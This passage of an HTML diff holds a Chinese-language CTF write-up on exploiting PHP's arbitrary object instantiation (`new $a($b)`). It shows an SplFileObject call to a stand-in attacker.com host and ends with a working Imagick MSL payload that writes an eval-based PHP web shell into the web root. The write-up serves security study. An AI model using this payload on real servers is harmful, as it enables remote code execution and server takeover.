E8F;&#x5217;&#x5316;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x6269;&#x5C55;&#x3002;&#x662F;&#x4EE5;&#x5E38;&#x89C4;&#x7684;&#x65B9;&#x6CD5;&#x90FD;out&#x6389;&#x4E86;&#x3002;</h2>
+
+<p><strong>&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;</strong></p>
+<ol>
+<li>var_dump(get_declared_classes());&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6240;&#x6709;&#x7684;&#x5185;&#x7F6E;&#x7C7B;</li>
+<li>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x53CD;&#x5C04; API&#x627E;&#x5230;&#x5177;&#x6709;&#x6709;&#x7528;&#x6784;&#x9020;&#x51FD;&#x6570;&#x7684;&#x7C7B;&#x3002;</li>
+</ol>
+<p>&#x5E38;&#x89C1;php&#x7248;&#x672C;&#x7684;&#x6240;&#x6709;&#x5185;&#x7F6E;&#x7C7B;&#xFF1A;<a href="https://3v4l.org/2JEGF">https://3v4l.org/2JEGF</a></p>
+<p>&#x5982;&#x679C;&#x60A8;&#x63A7;&#x5236;&#x591A;&#x4E2A;&#x6784;&#x9020;&#x51FD;&#x6570;&#x53C2;&#x6570;&#x5E76;&#x4E14;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x8C03;&#x7528;&#x4EFB;&#x610F;&#x65B9;&#x6CD5;&#xFF0C;&#x5219;&#x6709;&#x5F88;&#x591A;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x60A8;&#x53EA;&#x80FD;&#x4F20;&#x9012;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5E76;&#x4E14;&#x5BF9;&#x521B;&#x5EFA;&#x7684;&#x5BF9;&#x8C61;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x8C03;&#x7528;&#xFF0C;&#x90A3;&#x4E48;&#x51E0;&#x4E4E;&#x4EC0;&#x4E48;&#x90FD;&#x6CA1;&#x6709;&#x3002;</p>
+<p>&#x6211;&#x4EEC;&#x5C1D;&#x8BD5;&#x7ED9;&#x51FA;&#x51E0;&#x4E2A;&#x89E3;&#x6CD5;&#xFF1A;</p>
+<ol>
+<li>
+<p>&#x5229;&#x7528; SSRF + Phar &#x53CD;&#x5E8F;&#x5217;&#x5316;<br>
+&#x8BE5;&#x7C7B;SplFileObject&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x5141;&#x8BB8;&#x8FDE;&#x63A5;&#x5230;&#x4EFB;&#x4F55;&#x672C;&#x5730;&#x6216;&#x8FDC;&#x7A0B; URL &#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF1A;<br>
+<code>new SplFileObject(&apos;http://attacker.com/&apos;);</code></p>
+</li>
+<li>
+<p>&#x5229;&#x7528; PDO<br>
+PDO &#x7C7B;&#x6709;&#x53E6;&#x4E00;&#x4E2A;&#x6709;&#x8DA3;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF1A;<br>
+<code>new PDO(&quot;sqlite:/tmp/test.txt&quot;)</code></p>
+<p>&#x6784;&#x9020;PDO&#x51FD;&#x6570;&#x63A5;&#x53D7; DSN &#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x5DF2;&#x5B89;&#x88C5;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6269;&#x5C55;&#x8FDE;&#x63A5;&#x5230;&#x4EFB;&#x4F55;&#x672C;&#x5730;&#x6216;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x5E93;&#x3002;&#x4F8B;&#x5982;&#xFF0C;SQLite &#x6269;&#x5C55;&#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x7A7A;&#x6587;&#x4EF6;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x63D0;&#x4E00;&#x4E0B;DSN&#xFF1A;&#x6570;&#x636E;&#x6E90;&#x540D;&#x79F0;&#x6216;&#x53EB;&#x505A; DSN&#xFF0C;&#x5305;&#x542B;&#x4E86;&#x8BF7;&#x6C42;&#x8FDE;&#x63A5;&#x5230;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x901A;&#x5E38;&#xFF0C;&#x4E00;&#x4E2A; DSN &#x7531; PDO &#x9A71;&#x52A8;&#x540D;&#x3001;&#x7D27;&#x968F;&#x5176;&#x540E;&#x7684;&#x5192;&#x53F7;&#x3001;&#x4EE5;&#x53CA;&#x5177;&#x4F53; PDO &#x9A71;&#x52A8;&#x7684;&#x8FDE;&#x63A5;&#x8BED;&#x6CD5;&#x7EC4;&#x6210;&#x3002;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x4FE1;&#x606F;&#x80FD;&#x4ECE; PDO &#x5177;&#x4F53;&#x9A71;&#x52A8;&#x6587;&#x6863;&#x627E;&#x5230;&#x3002;</p>
+<p><img src="images/2022-08-04-20-00-04.png" alt><br>
+dsn &#x53C2;&#x6570;&#x652F;&#x6301;&#x4E09;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x65B9;&#x5F0F; &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#xFF1A;</p>
+</li>
+<li>
+<p>uri:file:///path/to/dsnfile<br>
+dsn&#x7531;uri&#x7EC4;&#x6210;:&#x540E;&#x9762;&#x8DDF;&#x7740;&#x4E00;&#x4E2A;uri&#xFF0C;&#x5B83;&#x5B9A;&#x4E49;&#x4E86;&#x5305;&#x542B;dsn&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#x3002;URI&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x6216;&#x8FDC;&#x7A0B;URL&#x3002;&#x8FD9;&#x91CC;&#x6CA1;&#x6CD5;&#x5229;&#x7528;&#x3002;</p>
+</li>
+<li></li>
+</ol>
+<p><img src="images/2022-08-06-17-33-00.png" alt></p>
+<p>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x6587;&#x4EF6;&#xFF0C;&#x5B83;&#x4F1A;<strong>&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x6587;&#x4EF6;</strong>&#xFF08;&#x53EA;&#x6709;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#xFF09;&#x8C8C;&#x4F3C;&#x4E5F;&#x6CA1;&#x4EC0;&#x4E48;&#x597D;&#x5229;&#x7528;&#x7684;&#xFF0C;&#x65E0;&#x6CD5;&#x5199;&#x5165;&#x5185;&#x5BB9;</p>
+<ol start="3">
+<li><img src="images/2022-08-06-17-35-10.png" alt><br>
+dsn&#x7531;&#x4E00;&#x4E2A;&#x540D;&#x79F0;name&#x7EC4;&#x6210;&#xFF0C;<a href="http://xn--dsnphp-dx7i4fu95ajyev8y3wax5bg18ftn5cfpl34eou5g.xn--inipdo-dw7i076y.dsn.name">&#x8BE5;&#x540D;&#x79F0;&#x6620;&#x5C04;&#x5230;&#x5B9A;&#x4E49;dsn&#x5B57;&#x7B26;&#x4E32;&#x7684;php.ini&#x4E2D;&#x7684;pdo.dsn.name</a>&#x3002;</li>
+</ol>
+<hr>
+<p>&#x6700;&#x540E;&#x6211;&#x4EEC;&#x53D1;&#x73B0;<code>new $a($b)</code>&#x5229;&#x7528;&#x7684;&#x65B0;&#x65B9;&#x6CD5;&#x3002;</p>
+<p><strong>&#x5229;&#x7528;Imagick</strong></p>
+<p>Imagick &#x56E0;&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x800C;&#x81ED;&#x540D;&#x662D;&#x8457;&#xFF0C;&#x4F8B;&#x5982; ImageTragick &#x7B49;&#x3002;&#x8FD9;&#x5C31;&#x662F;&#x6211;&#x51B3;&#x5B9A;&#x7EE7;&#x7EED;&#x7814;&#x7A76;&#x7684;&#x5730;&#x65B9;&#x3002;</p>
+<p>&#x5982;&#x679C;&#x76EE;&#x6807;&#x73AF;&#x5883;&#x91CC;&#x9762;&#x6709;Imagick&#x6269;&#x5C55;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;msl&#x6587;&#x4EF6;&#x5230;<code>/tmp/php*</code>&#x4E4B;&#x4E2D;&#xFF08;&#x56E0;&#x4E3A;php&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x90FD;&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x5E76;&#x4E14;&#x4EE5;php&#x5F00;&#x5934;&#xFF0C;&#x540E;&#x9762;&#x63A5;&#x968F;&#x673A;&#x6570;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;vid&#x6765;&#x904D;&#x5386;&#x6587;&#x4EF6;&#x627E;&#x5230;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;msl&#x6587;&#x4EF6;&#xFF0C;&#x518D;&#x901A;&#x8FC7;Imagick()&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#x652F;&#x6301;&#x8BFB;&#x53D6;msl&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x6765;&#x8FDB;&#x884C;&#x5199;&#x9A6C;&#x3002;&#xFF08;&#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x91CC;&#x6709;&#x4E24;&#x4E2A;&#x9650;&#x5236;&#xFF1A;1.Imagick&#x7248;&#x672C;&#x4F4E;&#x4E8E;&#x6216;&#x7B49;&#x4E8E;ImageMagick 6.8.9-9&#xFF0C;imagick module version =&gt; 3.4.3&#x5177;&#x4F53;&#x7248;&#x672C;&#x6CA1;&#x600E;&#x4E48;&#x6D4B;&#x8BD5;&#xFF0C;&#x4F46;&#x662F;&#x9AD8;&#x4E8E;6.9x&#x7684;&#x57FA;&#x672C;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x4E86;&#x3002;2.&#x6CE8;&#x610F; /etc/ImageMagick/policy.xml&#x662F;&#x5426;&#x5F00;&#x542F;&#x80FD;&#x591F;&#x5F15;&#x7528;msl&#xFF0C;&#x53EA;&#x6709;&#x8FD9;&#x4E24;&#x70B9;&#x6EE1;&#x8DB3;&#xFF0C;&#x8FD9;&#x624D;&#x7B97;&#x4E2A;&#x5229;&#x7528;&#x70B9;&#xFF09;3.&#x4F4E;&#x7248;&#x672C;&#x6709;&#x6548;&#xFF0C;&#x9AD8;&#x7248;&#x672C;&#x7531;&#x4E8E;&#x89E3;&#x6790;&#x7684;&#x95EE;&#x9898;&#x4F1A;&#x65E0;&#x6CD5;&#x6210;&#x529F;&#x89E3;&#x6790;msl&#x683C;&#x5F0F;</p>
+<p>&#x4E00;&#x4E9B;&#x5173;&#x4E8E;Imagick&#x7684;&#x6D4B;&#x8BD5;&#xFF1A;&#x5982;&#x4E0B;&#xFF1A;<br>
+msl&#x6D4B;&#x8BD5;&#xFF1A;<br>
+<img src="images/2022-08-06-23-23-25.png" alt></p>
+<p>&#x867D;&#x7136;&#x751F;&#x6210;1.php,&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x6240;&#x9700;&#x8981;&#x7684;php&#x8BED;&#x53E5;&#x88AB;&#x8F6C;&#x7801;&#x4E86;&#xFF0C;&#x65E0;&#x6CD5;&#x5229;&#x7528;</p>
+<p><img src="images/2022-08-06-23-24-43.png" alt></p>
+<p><img src="images/2022-08-06-23-25-13.png" alt><br>
+<img src="images/2022-08-06-23-25-30.png" alt></p>
+<p>&#x539F;&#x56E0;&#x662F;&#xFF1A;&#x6211;&#x4EEC;&#x7ED9;&#x51FA;&#x7684;&#x4E0D;&#x662F;&#x56FE;&#x7247;</p>
+<p><img src="images/2022-08-06-23-26-10.png" alt><br>
+<img src="images/2022-08-06-23-26-22.png" alt></p>
+<p><strong>&#x5206;&#x6790;</strong></p>
+<p>&#x201C;epsi:/local/path&#x201D;&#x6216;&#x201C;msl:/local/path&#x201D;&#x4E4B;&#x7C7B;&#x7684;&#x503C;&#x4F20;&#x9012;&#x7ED9;ImageMagick&#xFF0C;<br>
+&#x5B83;&#x5C06;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;&#x7684;&#x65B9;&#x6848;&#x90E8;&#x5206;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;epsi &#x6216;msl&#xFF0C;&#x6765;&#x786E;&#x5B9A;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#x3002;<br>
+&#x610F;&#x601D;&#x662F;&#xFF1A;msl&#x6216;epsi&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x544A;&#x8BC9;Imagick&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x56FE;&#x7247;&#xFF08;&#x4E00;&#x822C;&#x662F;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x8981;&#x79FB;&#x52A8;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF09;</p>
+<p>ImageMagick &#x683C;&#x5F0F;&#x662F; MSL<br>
+MSL &#x4EE3;&#x8868; Magick &#x811A;&#x672C;&#x8BED;&#x8A00;&#x3002;&#x5B83;&#x662F;&#x4E00;&#x79CD;&#x5185;&#x7F6E;&#x7684; ImageMagick &#x8BED;&#x8A00;&#xFF0C;&#x6709;&#x52A9;&#x4E8E;&#x8BFB;&#x53D6;&#x56FE;&#x50CF;&#x3001;&#x6267;&#x884C;&#x56FE;&#x50CF;&#x5904;&#x7406;&#x4EFB;&#x52A1;&#x4EE5;&#x53CA;&#x5C06;&#x7ED3;&#x679C;&#x5199;&#x56DE;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;</p>
+<p>Imagick &#x4E0D;&#x4EC5;&#x652F;&#x6301;&#x81EA;&#x5DF1;&#x7684; URL &#x65B9;&#x6848;&#xFF0C;&#x8FD8;&#x652F;&#x6301; PHP &#x65B9;&#x6848;&#xFF08;&#x4F8B;&#x5982;&#x201C;php://&#x201D;&#x3001;&#x201C;zlib://&#x201D;&#x7B49;&#xFF09;&#x3002;&#x6211;&#x51B3;&#x5B9A;&#x627E;&#x51FA;&#x5B83;&#x662F;&#x5982;&#x4F55;&#x5DE5;&#x4F5C;&#x7684;&#x3002;</p>
+<p>&#x201C;https://&#x201D;&#x8F6C;&#x5230; PHP&#xFF0C;&#x4F46;&#x201C;https://&#x201D;&#x8F6C;&#x5230; curl<br>
+ImageMagick &#x652F;&#x6301; 100 &#x591A;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x65B9;&#x6848;&#x3002;</p>
+<p>ImageMagick &#x7684;&#x4E00;&#x534A;&#x65B9;&#x6848;&#x6620;&#x5C04;&#x5230;&#x5916;&#x90E8;&#x7A0B;&#x5E8F;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;convert -list delegate&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6B64;&#x6620;&#x5C04;</p>
+<p>&#x6211;&#x53D1;&#x73B0; PHP &#x548C; ImageMagick &#x90FD;&#x652F;&#x6301; HTTPS &#x65B9;&#x6848;&#x3002;</p>
+<p>&#x6B64;&#x5916;&#xFF0C;&#x4F20;&#x9012;&#x201C;https://&#x201D;&#x5B57;&#x7B26;&#x4E32; new Imagick(...) &#x7ED5;&#x8FC7; PHP &#x7684; HTTPS &#x5BA2;&#x6237;&#x7AEF;&#x5E76;&#x8C03;&#x7528; curl &#x8FDB;&#x7A0B;</p>
+<p><strong>vid&#x65B9;&#x6848;</strong><br>
+ReadVIDImage(...)&#x7528;&#x4E8E;&#x89E3;&#x6790; VID &#x65B9;&#x6848;&#x7684;&#x51FD;&#x6570;&#xFF1A;<br>
+<img src="images/2022-08-06-23-37-54.png" alt></p>
+<p>VID &#x65B9;&#x6848;&#x63A5;&#x53D7;&#x63A9;&#x7801;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;&#x6784;&#x9020;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x4F7F;&#x7528;&#x8BE5;vid:&#x65B9;&#x6848;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x77E5;&#x9053;&#x5176;&#x540D;&#x79F0;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5C06;&#x6211;&#x4EEC;&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x5728; MSL &#x5185;&#x5BB9;&#x4E2D;&#xFF1A;</p>
+<p>&#x5728;&#x8FD9;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x53D1;&#x73B0;&#x4E86;&#x76F8;&#x5F53;&#x6709;&#x8DA3;caption:&#x7684;info:&#x8BA1;&#x5212;&#x3002;&#x4E24;&#x8005;&#x7684;&#x7ED3;&#x5408;&#x53EF;&#x4EE5;&#x6D88;&#x9664;&#x5E26;&#x5916;&#x8FDE;&#x63A5;&#xFF0C;&#x5E76;&#x4E00;&#x4E3E;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; web shell&#xFF1A;</p>
+<p>&#x4E2A;&#x4EBA;&#x603B;&#x7ED3;&#xFF1A;&#x5C31;&#x662F;Imagick&#x6784;&#x9020;&#x7684;&#x65F6;&#x5019;Imagick(&#x53C2;&#x6570;)&#xFF0C;&#x4ED6;&#x6CA1;&#x6709;&#x6839;&#x636E;&#x540E;&#x7F00;&#x540D;&#x53BB;&#x5904;&#x7406;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x662F;&#x6839;&#x636E;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x6765;&#x5224;&#x65AD;&#x6587;&#x4EF6;&#xFF0C;&#x8DDF;linux&#x4E00;&#x6837;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x4E34;&#x65F6;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x4F1A;&#x53D8;&#x6210;php+&#x968F;&#x673A;&#x6570;&#xFF0C;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x662F;xml&#x683C;&#x5F0F;&#x7684;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x4E00;&#x4E2A;msl&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x4ED6;&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x6309;&#x7167;msl&#x6587;&#x4EF6;&#x89E3;&#x6790;&#xFF0C;&#x7531;&#x6B64;&#x5199;&#x5165;&#x4E86;&#x6211;&#x4EEC;&#x7684;shell&#x5230;&#x6307;&#x5B9A;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</p>
+<p>msl&#x6587;&#x6863;&#xFF1A;<a href="https://www.imagemagick.org/script/conjure.php#msl">https://www.imagemagick.org/script/conjure.php#msl</a><br>
+&#x53C2;&#x8003;&#xFF1A;<a href="http://www.fmwconcepts.com/imagemagick/index.php">http://www.fmwconcepts.com/imagemagick/index.php</a><br>
+&#x9898;&#x89E3;&#x53C2;&#x8003;&#xFF1A;<a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a></p>
+<p>&#x8FD9;&#x91CC;&#x7ED9;&#x51FA;&#x6700;&#x7EC8;&#x9898;&#x89E3;</p>
+<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mi>I</mi><mi>m</mi><mi>a</mi><mi>g</mi><mi>i</mi><mi>c</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">a=Imagick</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">ma</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>b=vid:msl:/tmp/php*</p>
+<pre data-role="codeBlock" data-info="xml" class="language-xml"><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>caption:<span class="token entity named-entity" title="&lt;">&amp;lt;</span>?php @eval(@$_REQUEST[<span class="token punctuation">&apos;</span>a<span class="token punctuation">&apos;</span>]); ?<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>info:/var/www/html/1.php<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span>
+</pre><p>&#x5728;linux&#x4E0B;&#x5B89;&#x88C5;Imagic &#x6269;&#x5C55;<br>
+apt install php-imagick</p>
+<p>php -r &apos;new Imagick(vid:msl:/tmp/php*);&apos;</p>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
